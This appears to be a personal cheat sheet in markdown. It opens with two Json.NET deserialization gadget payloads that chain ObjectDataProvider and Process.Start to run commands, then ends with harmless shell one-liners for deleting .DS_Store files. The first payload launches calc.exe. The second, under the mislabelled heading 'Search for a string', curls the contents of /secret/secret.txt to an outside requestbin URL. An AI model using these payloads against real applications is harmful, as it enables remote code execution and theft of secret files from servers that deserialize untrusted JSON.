# Object Deserialization
## C# Newtonsoft
```sh
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c calc.exe']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```
#####

## Search for a string
```sh
{
    "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "MethodParameters":{
        "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values":["cmd","/ccurl -d @/secret/secret.txt https://requestbin.com/r/esr1gp03vq0f"]
    },
    "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
}
```
#####

## Find and delete files
```sh
#!/bin/sh

find . -name ".DS_Store*" -print 2>/dev/null |  xargs rm 

```
#####

## Find and delete files (in case of a space in path we should use)
```sh
#!/bin/sh

find . -name ".DS_Store*" -exec rm {} + 2>/dev/null 

```
